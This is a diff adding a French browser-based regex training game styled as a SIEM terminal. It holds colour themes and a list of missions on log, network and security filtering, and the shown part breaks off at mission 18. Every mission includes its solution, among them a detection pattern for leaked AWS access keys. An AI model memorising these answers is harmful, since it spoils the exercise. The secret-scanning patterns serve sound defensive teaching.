@@ -1,0 +1,1777 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>REGEX-OPS // SIEM & Packet Inspection Simulator</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&family=IBM+Plex+Mono:wght@400;700&family=JetBrains+Mono:wght@400;700&family=Share+Tech+Mono&family=Source+Code+Pro:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --c-bg: #0f1419;
+      --c-bar-bg: #090c10;
+      --c-bar-fg: #e6edf3;
+      --c-bar-dim: #7d8590;
+      --c-fg: #e6edf3;
+      --c-dim: #7d8590;
+      --c-border: #30363d;
+      --c-cyan: #39c5cf;
+      --c-green: #3fb950;
+      --c-red: #ff7b72;
+      --c-yellow: #d29922;
+      --c-magenta: #bc8cff;
+      --c-blue: #58a6ff;
+      --term-font: 'JetBrains Mono', monospace;
+      --term-size: 14px;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    html, body {
+      width: 100vw;
+      height: 100vh;
+      overflow: hidden;
+      background-color: var(--c-bg);
+      color: var(--c-fg);
+      font-family: var(--term-font);
+      font-size: var(--term-size);
+      line-height: 1.5;
+      display: flex;
+      flex-direction: column;
+      transition: background-color 0.15s, color 0.15s;
+    }
+
+    .terminal-viewport {
+      flex: 1;
+      width: 100%;
+      overflow-y: auto;
+      padding: 24px 20px 32px 20px;
+      cursor: text;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .terminal-inner {
+      width: 100%;
+      max-width: 920px;
+      margin: 0 auto;
+    }
+
+    #term-output {
+      white-space: pre-wrap;
+      word-break: break-word;
+      width: 100%;
+    }
+
+    .log-line { margin-bottom: 1px; }
+
+    .c-fg { color: var(--c-fg); }
+    .c-dim { color: var(--c-dim); }
+    .c-cyan { color: var(--c-cyan); }
+    .c-green { color: var(--c-green); }
+    .c-red { color: var(--c-red); }
+    .c-yellow { color: var(--c-yellow); }
+    .c-magenta { color: var(--c-magenta); }
+    .c-blue { color: var(--c-blue); }
+    .bold { font-weight: bold; }
+
+    .badge-tier {
+      background-color: var(--c-blue);
+      color: var(--c-bg);
+      font-weight: bold;
+      padding: 1px 6px;
+      border-radius: 2px;
+    }
+    .badge-theme {
+      background-color: var(--c-magenta);
+      color: var(--c-bg);
+      font-weight: bold;
+      padding: 1px 6px;
+      border-radius: 2px;
+    }
+    .badge-gold {
+      background-color: var(--c-yellow);
+      color: #000000;
+      font-weight: bold;
+      padding: 1px 6px;
+      border-radius: 2px;
+    }
+    .match-hl {
+      background-color: rgba(250, 204, 21, 0.22);
+      border-bottom: 1px solid var(--c-yellow);
+      font-weight: bold;
+    }
+
+    .prompt-line {
+      display: flex;
+      align-items: center;
+      margin-top: 4px;
+      width: 100%;
+    }
+
+    .prompt-prefix {
+      white-space: nowrap;
+      margin-right: 8px;
+      user-select: none;
+    }
+
+    #cmd-input {
+      flex: 1;
+      background: transparent;
+      border: none;
+      outline: none;
+      color: var(--c-fg);
+      font-family: inherit;
+      font-size: inherit;
+      line-height: inherit;
+      caret-color: var(--c-cyan);
+    }
+
+    .status-footer {
+      height: 36px;
+      background-color: var(--c-bar-bg);
+      color: var(--c-bar-fg);
+      border-top: 1px solid var(--c-border);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 0 16px;
+      font-size: 12px;
+      user-select: none;
+      flex-shrink: 0;
+      overflow-x: auto;
+    }
+
+    .footer-inner {
+      width: 100%;
+      max-width: 1120px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .footer-left, .footer-right {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      white-space: nowrap;
+    }
+
+    .tmux-tag {
+      background: var(--c-magenta);
+      color: #000000;
+      font-weight: bold;
+      padding: 2px 7px;
+      border-radius: 2px;
+    }
+
+    .nav-cmd {
+      color: var(--c-bar-dim);
+      cursor: pointer;
+      padding: 2px 4px;
+      transition: opacity 0.12s;
+    }
+    .nav-cmd:hover {
+      color: var(--c-bar-fg);
+      text-decoration: underline;
+    }
+    .nav-cmd b { color: var(--c-bar-fg); }
+
+    .ctrl-group {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      color: var(--c-bar-dim);
+    }
+
+    .term-select {
+      background: var(--c-bg);
+      color: var(--c-fg);
+      border: 1px solid var(--c-border);
+      border-radius: 3px;
+      padding: 2px 6px;
+      font-family: inherit;
+      font-size: 11px;
+      cursor: pointer;
+      outline: none;
+    }
+    .term-select:hover, .term-select:focus {
+      border-color: var(--c-cyan);
+    }
+
+    .terminal-viewport::-webkit-scrollbar { width: 8px; }
+    .terminal-viewport::-webkit-scrollbar-track { background: var(--c-bg); }
+    .terminal-viewport::-webkit-scrollbar-thumb {
+      background: var(--c-border);
+      border-radius: 4px;
+    }
+    .terminal-viewport::-webkit-scrollbar-thumb:hover { background: var(--c-dim); }
+  </style>
+</head>
+<body>
+
+  <!-- ESPACE TERMINAL CENTRÉ -->
+  <main class="terminal-viewport" id="term-box" onclick="focusPrompt()">
+    <div class="terminal-inner">
+      <div id="term-output"></div>
+      <form class="prompt-line" id="prompt-form" onsubmit="onPromptSubmit(event)" autocomplete="off">
+        <span class="prompt-prefix" id="prompt-label"></span>
+        <input type="text" id="cmd-input" autofocus spellcheck="false" />
+      </form>
+    </div>
+  </main>
+
+  <!-- PIED DE PAGE STYLE TMUX -->
+  <footer class="status-footer">
+    <div class="footer-inner">
+      <div class="footer-left">
+        <span class="tmux-tag">0:regex-ops*</span>
+        <span class="nav-cmd" onclick="execFromNav('start')">[<b>1</b>:Campagne]</span>
+        <span class="nav-cmd" onclick="execFromNav('custom')">[<b>2</b>:Custom]</span>
+        <span class="nav-cmd" onclick="execFromNav('stats')">[<b>3</b>:Profil/Bonus]</span>
+        <span class="nav-cmd" onclick="execFromNav('board')">[<b>4</b>:Board]</span>
+        <span class="nav-cmd" onclick="execFromNav('memo')">[<b>5</b>:Mémo]</span>
+        <span class="nav-cmd" onclick="execFromNav('hint')">[<b>6</b>:Indice]</span>
+        <span class="nav-cmd" onclick="execFromNav('clear')">[<b>7</b>:Clear]</span>
+        <span class="nav-cmd" onclick="window.location.href='../'">[<b>↩</b>:Portail]</span>
+      </div>
+
+      <div class="footer-right">
+        <div class="ctrl-group">
+          <span>Thème:</span>
+          <select id="theme-select" class="term-select" onchange="setTheme(this.value)"></select>
+        </div>
+
+        <div class="ctrl-group">
+          <span>Police:</span>
+          <select id="font-select" class="term-select" onchange="setFontFamily(this.value)">
+            <option value="'JetBrains Mono', monospace">JetBrains Mono</option>
+            <option value="'Fira Code', monospace">Fira Code</option>
+            <option value="'IBM Plex Mono', monospace">IBM Plex Mono</option>
+            <option value="'Source Code Pro', monospace">Source Code Pro</option>
+            <option value="'Share Tech Mono', monospace">Share Tech Mono (CRT)</option>
+            <option value="'Courier New', Courier, monospace">Courier New</option>
+          </select>
+        </div>
+
+        <div class="ctrl-group">
+          <span>Taille:</span>
+          <select id="size-select" class="term-select" onchange="setFontSize(this.value)">
+            <option value="12px">12px</option>
+            <option value="13px">13px</option>
+            <option value="14px">14px</option>
+            <option value="15px">15px</option>
+            <option value="16px">16px</option>
+            <option value="18px">18px</option>
+            <option value="20px">20px</option>
+          </select>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+<script>
+// =============================================================================
+// CONFIGURATION OPTIONNELLE DU LEADERBOARD PUBLIC (SUPABASE REST API)
+// =============================================================================
+const SUPABASE_URL = "";
+const SUPABASE_KEY = "";
+
+// =============================================================================
+// 1. PALETTES DE THÈMES (AVEC THÈMES PRESTIGE DÉBLOCABLES)
+// =============================================================================
+const THEMES = {
+  "bash-classic": {
+    label: "Bash / Pop!_OS (Défaut)", group: "Standards Modernes",
+    bg: "#0f1419", bar: "#090c10", fg: "#e6edf3", dim: "#7d8590", border: "#30363d",
+    cyan: "#39c5cf", green: "#3fb950", red: "#ff7b72", yellow: "#d29922", magenta: "#bc8cff", blue: "#58a6ff"
+  },
+  "dracula": {
+    label: "Dracula", group: "Standards Modernes",
+    bg: "#282a36", bar: "#191a21", fg: "#f8f8f2", dim: "#6272a4", border: "#44475a",
+    cyan: "#8be9fd", green: "#50fa7b", red: "#ff5555", yellow: "#f1fa8c", magenta: "#ff79c6", blue: "#bd93f9"
+  },
+  "catppuccin": {
+    label: "Catppuccin Mocha", group: "Standards Modernes",
+    bg: "#1e1e2e", bar: "#11111b", fg: "#cdd6f4", dim: "#6c7086", border: "#313244",
+    cyan: "#89dceb", green: "#a6e3a1", red: "#f38ba8", yellow: "#f9e2af", magenta: "#cba6f7", blue: "#89b4fa"
+  },
+  "tokyo-night": {
+    label: "Tokyo Night", group: "Standards Modernes",
+    bg: "#1a1b26", bar: "#13141c", fg: "#c0caf5", dim: "#565f89", border: "#292e42",
+    cyan: "#7dcfff", green: "#9ece6a", red: "#f7768e", yellow: "#e0af68", magenta: "#bb9af7", blue: "#7aa2f7"
+  },
+  "gruvbox": {
+    label: "Gruvbox Dark", group: "Standards Modernes",
+    bg: "#282828", bar: "#1d2021", fg: "#ebdbb2", dim: "#928374", border: "#3c3836",
+    cyan: "#8ec07c", green: "#b8bb26", red: "#fb4934", yellow: "#fabd2f", magenta: "#d3869b", blue: "#83a598"
+  },
+  "nord": {
+    label: "Nord Polar", group: "Standards Modernes",
+    bg: "#2e3440", bar: "#242933", fg: "#eceff4", dim: "#81a1c1", border: "#3b4252",
+    cyan: "#88c0d0", green: "#a3be8c", red: "#bf616a", yellow: "#ebcb8b", magenta: "#b48ead", blue: "#5e81ac"
+  },
+  "solarized": {
+    label: "Solarized Dark", group: "Standards Modernes",
+    bg: "#002b36", bar: "#001f27", fg: "#93a1a1", dim: "#586e75", border: "#073642",
+    cyan: "#2aa198", green: "#859900", red: "#dc322f", yellow: "#b58900", magenta: "#d33682", blue: "#268bd2"
+  },
+  // --- Sci-Fi & Cyber ---
+  "case": {
+    label: "Case (Neuromancer)", group: "Univers Sci-Fi & Cyber",
+    bg: "#0b001a", bar: "#05000d", fg: "#e0fbfc", dim: "#8a6bbd", border: "#ff0055",
+    cyan: "#00f0ff", green: "#00ff9f", red: "#ff0055", yellow: "#fcee09", magenta: "#ff00a0", blue: "#b86bff"
+  },
+  "smith": {
+    label: "Smith (Matrix CRT)", group: "Univers Sci-Fi & Cyber",
+    bg: "#050d05", bar: "#020602", fg: "#70ff70", dim: "#267326", border: "#144514",
+    cyan: "#a8ffa8", green: "#00ff41", red: "#ff5555", yellow: "#d4ff00", magenta: "#50fa7b", blue: "#00cc33"
+  },
+  "jensen": {
+    label: "Jensen (Sarif Amber)", group: "Univers Sci-Fi & Cyber",
+    bg: "#120f0a", bar: "#090704", fg: "#ffb000", dim: "#996900", border: "#4d3600",
+    cyan: "#ffd875", green: "#a6e22e", red: "#ff5533", yellow: "#ffe066", magenta: "#ff8c00", blue: "#e69500"
+  },
+  // --- Machines Historiques ---
+  "vt100": {
+    label: "DEC VT100 (PDP-11 P1)", group: "Machines Historiques",
+    bg: "#061006", bar: "#030803", fg: "#33ff33", dim: "#1f991f", border: "#145214",
+    cyan: "#80ff80", green: "#33ff33", red: "#ff6644", yellow: "#ccff33", magenta: "#66ff99", blue: "#29cc29"
+  },
+  "ibm3270": {
+    label: "IBM 3270 (Mainframe)", group: "Machines Historiques",
+    bg: "#000000", bar: "#0d0d0d", fg: "#44ff44", dim: "#2b9348", border: "#0077b6",
+    cyan: "#00e5ff", green: "#44ff44", red: "#ff4444", yellow: "#ffff44", magenta: "#ff66ff", blue: "#48cae4"
+  },
+  "c64": {
+    label: "Commodore 64 (PETSCII)", group: "Machines Historiques",
+    bg: "#40318d", bar: "#352879", fg: "#a093e0", dim: "#7869c4", border: "#7869c4",
+    barFg: "#ffffff", barDim: "#bfce72",
+    cyan: "#6abfc6", green: "#9ae29b", red: "#ff8a7a", yellow: "#bfce72", magenta: "#d084bd", blue: "#ffffff"
+  },
+  "amiga": {
+    label: "Amiga Workbench 1.3", group: "Machines Historiques",
+    bg: "#0055aa", bar: "#ffffff", fg: "#ffffff", dim: "#aaccff", border: "#ff8800",
+    barFg: "#0055aa", barDim: "#002244",
+    cyan: "#00ffff", green: "#55ff55", red: "#ffaa88", yellow: "#ff8800", magenta: "#ffcc00", blue: "#ffffff"
+  },
+  "apple2": {
+    label: "Apple IIe (Monitor II)", group: "Machines Historiques",
+    bg: "#0a0f0a", bar: "#141c14", fg: "#48ff48", dim: "#2e8b2e", border: "#225522",
+    cyan: "#00bfff", green: "#48ff48", red: "#ff6b35", yellow: "#ffd166", magenta: "#d040ff", blue: "#48cae4"
+  },
+  "win98": {
+    label: "Windows 98 (MS-DOS)", group: "Machines Historiques",
+    bg: "#000080", bar: "#c0c0c0", fg: "#ffffff", dim: "#b8c4ff", border: "#ffffff",
+    barFg: "#000000", barDim: "#2b2b2b",
+    cyan: "#00ffff", green: "#55ff55", red: "#ff5555", yellow: "#ffff55", magenta: "#ff55ff", blue: "#80bfff"
+  },
+  // --- Thèmes Prestige à Débloquer ---
+  "mr-robot": {
+    label: "Fsociety (Mr. Robot)", group: "Bonus Déblocables", locked: true,
+    unlockHint: "Maîtrise 9 missions (Palier N2)",
+    bg: "#080708", bar: "#14080a", fg: "#e5e5e5", dim: "#7a5256", border: "#e6192e",
+    cyan: "#00e5ff", green: "#50fa7b", red: "#ff1e38", yellow: "#ffb86c", magenta: "#ff2e63", blue: "#ff5555"
+  },
+  "lain": {
+    label: "Lain (Wired Copland OS)", group: "Bonus Déblocables", locked: true,
+    unlockHint: "Maîtrise 18 missions (Palier N3)",
+    bg: "#0d0618", bar: "#06020c", fg: "#f0d9ff", dim: "#7c5295", border: "#d946ef",
+    cyan: "#67e8f9", green: "#4ade80", red: "#fb7185", yellow: "#fde047", magenta: "#f472b6", blue: "#c084fc"
+  },
+  "ghost-root": {
+    label: "Zero-Day Gold (Blackhat)", group: "Bonus Déblocables", locked: true,
+    unlockHint: "Maîtrise 27 missions (Palier N4)",
+    bg: "#0a0908", bar: "#050403", fg: "#f5f0e6", dim: "#8c7a5b", border: "#ffd700",
+    cyan: "#ffd700", green: "#52b788", red: "#ef476f", yellow: "#ffbe0b", magenta: "#f77f00", blue: "#e0a96d"
+  },
+  "pipboy": {
+    label: "RobCo Pip-Boy 3000", group: "Bonus Déblocables", locked: true,
+    unlockHint: "Réussis un OVERCLOCK (< 6s du 1er coup)",
+    bg: "#07170b", bar: "#040d06", fg: "#2bfe72", dim: "#16853b", border: "#2bfe72",
+    cyan: "#99ffbb", green: "#2bfe72", red: "#ff6b6b", yellow: "#ffe66d", magenta: "#72efdd", blue: "#4ea8de"
+  },
+  "wargames": {
+    label: "WOPR (NORAD 1983)", group: "Bonus Déblocables", locked: true,
+    unlockHint: "Réalise une Série de 5 sans faute (Streak x5)",
+    bg: "#020b18", bar: "#01060d", fg: "#70e0ff", dim: "#2c6e91", border: "#00b4d8",
+    cyan: "#90e0ef", green: "#00f5d4", red: "#ff4d6d", yellow: "#ffd166", magenta: "#48cae4", blue: "#00b4d8"
+  }
+};
+
+// =============================================================================
+// 2. BASE DE DONNÉES DES 48 MISSIONS REGEX (5 PALIERS | NET, SYS, SEC)
+// =============================================================================
+const MISSIONS = [
+  // --- TIER 1 : TECHNICIEN N1 (Le piège du '.', Ancres ^ $, Quantifieurs +, ?, *, [^...]) ---
+  { id: 1, diff: 1, theme: "NET", title: "Le piège du point en RegEx (. vs \\.) & Ancres (^ $)",
+    scenario: "En RegEx, '.' matche N'IMPORTE QUEL caractère (contrairement au glob) et la recherche est partielle par défaut ! Cible uniquement les IP '10.0.0.0' à '10.0.0.9' sans capturer '10_0_0_1', '10.0.0.10' ni '210.0.0.1'.",
+    targets: ["10.0.0.1", "10.0.0.2", "10.0.0.5", "10.0.0.9"],
+    decoys: ["10_0_0_1", "10a0b0c1", "10.0.0.10", "210.0.0.1", "10.0.0.1.bak"],
+    hint: "Ancre le début '^' et la fin '$', et échappe chaque point avec un antislash : '^10\\.0\\.0\\.[0-9]$'.",
+    solution: "^10\\.0\\.0\\.[0-9]$",
+    debrief: "Différence fondamentale avec le Globbing : en RegEx, '.' est le joker universel (1 caractère quelconque). Pour matcher un vrai point, il faut l'échapper '\\.'. De plus, '^' et '$' empêchent les correspondances partielles dans '210.0.0.1' ou '10.0.0.10'." },
+  { id: 2, diff: 1, theme: "SYS", title: "Ancrage de début de ligne (^)",
+    scenario: "Dans un flux journalisé, isole uniquement les lignes qui COMMENCENT par la chaîne 'ERROR:', en ignorant les lignes où 'ERROR:' apparaît plus loin dans le message.",
+    targets: ["ERROR: disk full on /var", "ERROR: I/O timeout sda", "ERROR: oom-killer invoked", "ERROR: module nvme failed"],
+    decoys: ["WARN: ERROR: retry in 5s", "DEBUG: no ERROR: found", "INFO: previous ERROR: cleared", "FATAL_ERROR: kernel panic"],
+    hint: "Place l'ancre de début de ligne '^' juste devant 'ERROR:'.",
+    solution: "^ERROR:",
+    debrief: "L'accent circonflexe '^' hors crochets ancre l'expression au tout début de la ligne. Pas besoin d'ajouter '.*' à la fin : en RegEx (comme avec grep), un motif matche dès qu'il est trouvé dans la ligne." },
+  { id: 3, diff: 1, theme: "SEC", title: "Ancrage de fin de ligne ($)",
+    scenario: "Isole les événements SSH qui se TERMINENT exactement par 'port 22' (sans capturer les ports 2222, 2200 ou les redirections).",
+    targets: ["Accepted publickey for adrien port 22", "Failed password for root port 22", "Connection closed by 10.0.0.5 port 22", "Received disconnect port 22"],
+    decoys: ["Accepted publickey for adrien port 2222", "Connection closed port 2200", "Forwarded port 22 -> 8080", "port 22: connection refused"],
+    hint: "Utilise l'ancre de fin de ligne '$' juste après 'port 22'.",
+    solution: "port 22$",
+    debrief: "Le symbole '$' verrouille la fin de la chaîne : 'port 22$' rejette immédiatement 'port 2222' car le dernier caractère avant la fin de ligne doit être le second '2'." },
+  { id: 4, diff: 1, theme: "NET", title: "Quantifieur '+' (1 ou plusieurs occurrences)",
+    scenario: "Cible les noms d'interfaces Ethernet composés exactement du préfixe 'eth' suivi d'AU MOINS un chiffre (eth0, eth12, eth100...).",
+    targets: ["eth0", "eth1", "eth12", "eth100"],
+    decoys: ["eth", "eth0a", "veth0", "eth_0", "eth0.10"],
+    hint: "Ancre avec '^' et '$' et applique le quantifieur '+' sur la classe '[0-9]' : '^eth[0-9]+$'.",
+    solution: "^eth[0-9]+$",
+    debrief: "En RegEx, '+' répète l'élément qui le précède immédiatement 1 à N fois. Contrairement au glob 'eth*', '^eth[0-9]+$' exige que tous les caractères après 'eth' soient des chiffres." },
+  { id: 5, diff: 1, theme: "SYS", title: "Le piège du '?' en RegEx (Optionnalité 0 ou 1)",
+    scenario: "Attention : en RegEx, '?' ne matche PAS un caractère quelconque (c'est le rôle de '.') ! Il rend le caractère précédent OPTIONNEL (0 ou 1 fois). Cible exactement 'http://' et 'https://'.",
+    targets: ["http://", "https://"],
+    decoys: ["httpx://", "httpa://", "httpss://", "ftp://", "http://local"],
+    hint: "Place '?' juste après la lettre 's' pour la rendre facultative : '^https?://$'.",
+    solution: "^https?://$",
+    debrief: "En Globbing, '?' = 1 caractère quelconque. En RegEx, '?' = 0 ou 1 fois l'élément précédent ! Ainsi 's?' signifie « avec ou sans la lettre s »." },
+  { id: 6, diff: 1, theme: "SEC", title: "Classe de caractères niée ([^...] vs [!...] en Glob)",
+    scenario: "En RegEx, la négation à l'intérieur des crochets s'écrit avec '^' ('[^...]') et non '!'. Cible les comptes 'svc_X' où X est un caractère unique qui n'est NI un chiffre (0-9) NI un underscore '_'.",
+    targets: ["svc_a", "svc_Z", "svc_k", "svc_m"],
+    decoys: ["svc_0", "svc_9", "svc__", "svc_ab", "svc_"],
+    hint: "Utilise '^svc_[^0-9_]$'.",
+    solution: "^svc_[^0-9_]$",
+    debrief: "Moyen mnémotechnique : '^' hors crochets (`^abc`) = début de ligne ; '^' juste après le crochet ouvrant (`[^abc]`) = tout caractère SAUF a, b ou c." },
+  { id: 7, diff: 1, theme: "NET", title: "Le quantifieur '*' en RegEx (0 ou N fois le token précédent)",
+    scenario: "En RegEx, '*' répète le caractère qui le précède 0 ou plusieurs fois (il ne matche pas tout tout seul !). Cible les réponses ping '64 bytes:' suivies de 0 ou plusieurs espaces, puis 'icmp_seq=' et 1 chiffre.",
+    targets: ["64 bytes:icmp_seq=1", "64 bytes: icmp_seq=2", "64 bytes:    icmp_seq=9"],
+    decoys: ["64 bytes:_icmp_seq=1", "64 bytes: -- icmp_seq=1", "64 bytes: icmp_seq=10", "128 bytes: icmp_seq=1"],
+    hint: "Place l'étoile après un espace littéral : '^64 bytes: *icmp_seq=[0-9]$'.",
+    solution: "^64 bytes: *icmp_seq=[0-9]$",
+    debrief: "Erreur numéro 1 des débutants : penser que '*' signifie « n'importe quoi ». En RegEx, ' *' signifie « 0 ou N espaces », tandis que « 0 ou N caractères quelconques » s'écrit '.*'." },
+  { id: 8, diff: 1, theme: "SYS", title: "Filtrage OUI MAC Hexadécimal Majuscule",
+    scenario: "Cible uniquement les identifiants commençant par l'OUI '00:1A:2B:' suivi d'exactement 2 caractères hexadécimaux MAJUSCULES (0-9 ou A-F).",
+    targets: ["00:1A:2B:00", "00:1A:2B:FF", "00:1A:2B:9A", "00:1A:2B:C4"],
+    decoys: ["00:1A:2B:ff", "00:1A:2B:0G", "00:1A:2B:0", "00:1A:2B:000", "00-1A-2B-FF"],
+    hint: "Utilise '^00:1A:2B:[0-9A-F][0-9A-F]$' (ou '{2}').",
+    solution: "^00:1A:2B:[0-9A-F]{2}$",
+    debrief: "Tu peux écrire '[0-9A-F][0-9A-F]' ou utiliser le quantifieur de répétition exacte '[0-9A-F]{2}'." },
+  { id: 9, diff: 1, theme: "SEC", title: "Échappement des crochets littéraux (\\[ et \\])",
+    scenario: "Dans un journal d'authentification, cible les lignes contenant 'sshd[NNN]:' où NNN est un PID d'exactement 3 chiffres entre crochets.",
+    targets: ["sshd[104]: Accepted publickey", "sshd[999]: Failed password", "sshd[420]: Disconnected"],
+    decoys: ["sshd104: Accepted publickey", "sshd[12]: Accepted", "sshd[1040]: Failed", "sshd[abc]: Error"],
+    hint: "Échappe les crochets externes avec '\\[' et '\\]' : 'sshd\\[[0-9]{3}\\]:'.",
+    solution: "sshd\\[[0-9]{3}\\]:",
+    debrief: "Puisque '[' et ']' servent à définir des classes de caractères en RegEx, il faut les précéder d'un antislash ('\\[', '\\]') lorsqu'on cherche de vrais crochets dans des logs." },
+
+  // --- TIER 2 : ADMIN SYSTÈME N2 (Classes PCRE \d \w \s, Bornes \b & Quantifieurs {n,m}) ---
+  { id: 10, diff: 2, theme: "NET", title: "Codes d'erreur HTTP 4xx/5xx (\\d et {n})",
+    scenario: "Isole les requêtes Nginx ayant retourné un code d'erreur client (400-499) ou serveur (500-599) juste après 'HTTP/1.1\" '.",
+    targets: ["\"GET /\" HTTP/1.1\" 404 128", "\"POST /api\" HTTP/1.1\" 500 0", "\"GET /admin\" HTTP/1.1\" 403 52", "\"PUT /db\" HTTP/1.1\" 502 64"],
+    decoys: ["\"GET /\" HTTP/1.1\" 200 404", "\"GET /\" HTTP/1.1\" 301 500", "\"GET /\" HTTP/1.1\" 4040 12", "\"GET /\" HTTP/2.0\" 404 128"],
+    hint: "Combine 'HTTP/1\\.1\" [45]\\d{2} ' (note l'espace final pour éviter 4040).",
+    solution: "HTTP/1\\.1\" [45]\\d{2} ",
+    debrief: "'\\d' est l'abréviation PCRE pour '[0-9]'. En incluant 'HTTP/1\\.1\" ' devant '[45]\\d{2} ', on évite de confondre le code HTTP avec la taille de la réponse (ex: '200 404')." },
+  { id: 11, diff: 2, theme: "SYS", title: "Quantifieur d'intervalle {min,max} et \\w",
+    scenario: "Valide les noms de comptes Linux composés de 3 à 6 caractères alphanumériques ou underscore ('\\w'), commençant impérativement par une lettre minuscule.",
+    targets: ["adrien", "soc_1", "root", "net01"],
+    decoys: ["ab", "admin_soc_01", "1user", "Root", "user-1"],
+    hint: "1 lettre minuscule '[a-z]' suivie de 2 à 5 caractères '\\w' : '^[a-z]\\w{2,5}$'.",
+    solution: "^[a-z]\\w{2,5}$",
+    debrief: "'\\w' correspond à '[a-zA-Z0-9_]'. Comme '[a-z]' consomme déjà le 1er caractère, '\\w{2,5}' ajoute 2 à 5 caractères, soit une longueur totale de 3 à 6 caractères." },
+  { id: 12, diff: 2, theme: "SEC", title: "Frontières de mots (\\b Word Boundary)",
+    scenario: "Détecte toutes les lignes mentionnant le mot exact 'root', sans déclencher de faux positif sur 'chroot', 'rootkit', 'groot' ou 'root_backup'.",
+    targets: ["user=root uid=0", "sudo su - root", "root:x:0:0:super:/root", "alert(root)privilege"],
+    decoys: ["chroot /mnt/jail", "alert: rootkit_detected", "user=groot uid=1001", "dir=/var/root_backup"],
+    hint: "Encadre le mot par deux ancres de frontière de mot : '\\broot\\b'.",
+    solution: "\\broot\\b",
+    debrief: "'\\b' est une assertion de largeur nulle qui matche la transition entre un caractère de mot ('\\w') et un caractère non-mot ('\\W' ou début/fin de ligne). Indispensable en recherche d'IOC !" },
+  { id: 13, diff: 2, theme: "NET", title: "Segments IPv6 compressés ({1,4})",
+    scenario: "Valide les adresses IPv6 abrégées de la forme '::XXXX:YYYY' où chaque bloc contient entre 1 et 4 caractères hexadécimaux.",
+    targets: ["::1:80", "::fe80:1", "::dead:beef", "::2001:db8"],
+    decoys: ["::1:80800", "::gggg:1", ":1:80", "::1:2:3", "::1::80"],
+    hint: "Utilise '^::[0-9a-fA-F]{1,4}:[0-9a-fA-F]{1,4}$'.",
+    solution: "^::[0-9a-fA-F]{1,4}:[0-9a-fA-F]{1,4}$",
+    debrief: "Le quantifieur '{1,4}' accepte aussi bien un bloc court ('1') qu'un bloc complet de 16 bits ('fe80'), tout en rejetant les blocs de 5 caractères ('80800')." },
+  { id: 14, diff: 2, theme: "SYS", title: "Espaces blancs (\\s+) et Non-espaces (\\S+)",
+    scenario: "Dans '/etc/fstab', cible les lignes actives (non commentées) commençant par 'UUID=' suivi d'un identifiant sans espace ('\\S+'), d'un ou plusieurs espaces, puis du point de montage exact '/boot' suivi d'un espace.",
+    targets: ["UUID=4a2f-99 /boot ext4", "UUID=10b-c0    /boot vfat", "UUID=999 /boot xfs"],
+    decoys: ["UUID=4a2f-99 /boot/efi vfat", "# UUID=4a2f-99 /boot ext4", "UUID= /boot ext4", "/dev/sda1 /boot ext4"],
+    hint: "Combine '^UUID=\\S+\\s+/boot\\s+'.",
+    solution: "^UUID=\\S+\\s+/boot\\s+",
+    debrief: "Le couple '\\S+' (au moins un caractère non-espace) et '\\s+' (au moins un espace/tabulation) est l'outil idéal pour découper des colonnes dans les fichiers de configuration Unix." },
+  { id: 15, diff: 2, theme: "SEC", title: "Condensats Hash d'au moins 16 caractères ({16,})",
+    scenario: "Isole les chaînes composées uniquement de caractères hexadécimaux minuscules d'une longueur minimale de 16 caractères.",
+    targets: ["0123456789abcdef", "deadbeefc0ffee00112233", "a1b2c3d4e5f60718293a"],
+    decoys: ["0123456789abcde", "DEADBEEFC0FFEE0011", "0123456789abcdefg", "dead_beef_c0ffee_00"],
+    hint: "Utilise la borne ouverte '{16,}' : '^[0-9a-f]{16,}$'.",
+    solution: "^[0-9a-f]{16,}$",
+    debrief: "Ommettre la borne supérieure dans '{16,}' signifie « 16 fois ou plus »." },
+  { id: 16, diff: 2, theme: "NET", title: "Validation d'adresse MAC complète par groupe répété",
+    scenario: "Valide une adresse MAC de 6 octets hexadécimaux séparés par ':' en répétant 5 fois le motif '<octet>:' suivi d'un dernier '<octet>'.",
+    targets: ["00:1a:2b:3c:4d:5e", "FF:FF:FF:FF:FF:FF", "08:00:27:a1:b2:c3"],
+    decoys: ["00:1a:2b:3c:4d", "00:1a:2b:3c:4d:5e:6f", "00-1a-2b-3c-4d-5e", "00:1g:2b:3c:4d:5e"],
+    hint: "Garde '([0-9a-fA-F]{2}:){5}' en tête, suivi de '[0-9a-fA-F]{2}$'.",
+    solution: "^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$",
+    debrief: "Grouper '([0-9a-fA-F]{2}:)' avec des parenthèses permet de lui appliquer le quantifieur '{5}' d'un seul bloc." },
+  { id: 17, diff: 2, theme: "SYS", title: "Détection d'anomalies par classe inverse (\\D)",
+    scenario: "Isole les paramètres 'pid=<val>' corrompus contenant au moins un caractère NON-numérique ('\\D') après 'pid='.",
+    targets: ["pid=12a4", "pid=null", "pid=-1", "pid=402_"],
+    decoys: ["pid=1", "pid=42", "pid=99999", "ppid=12a4"],
+    hint: "Ancre '^pid=\\d*\\D' (0 ou N chiffres suivis d'au moins un non-chiffre).",
+    solution: "^pid=\\d*\\D",
+    debrief: "En PCRE, les majuscules inversent les classes abrégées : '\\D' = '[^0-9]', '\\W' = '[^a-zA-Z0-9_]', '\\S' = '[^\\s]'." },
+  { id: 18, diff: 2, theme: "SEC", title: "Chasse aux clés d'accès AWS (Secret Scanning)",
+    scenario: "Isole les clés d'accès AWS IAM valides : préfixe 'AKIA' suivi d'exactement 16 caractères majuscules ou chiffres, délimitées par des frontières de mots.",
+    targets: ["key=AKIAIOSFODNN7EXAMPLE", "export AKIA1234567890ABCDEF", "\"AKIA9999888877776666\""],
+    decoys: ["AKIA12345", "AKIAiosfodnn7example", "XAKIA1234567890ABCDEF", "AKIA1234567890ABCDEF99"],
+    hint: "Utilise '\\bAKIA[A-Z0-9]{16}\\b'.",
+    solution: "\\bAKIA[A-Z0-9]{16}\\b",
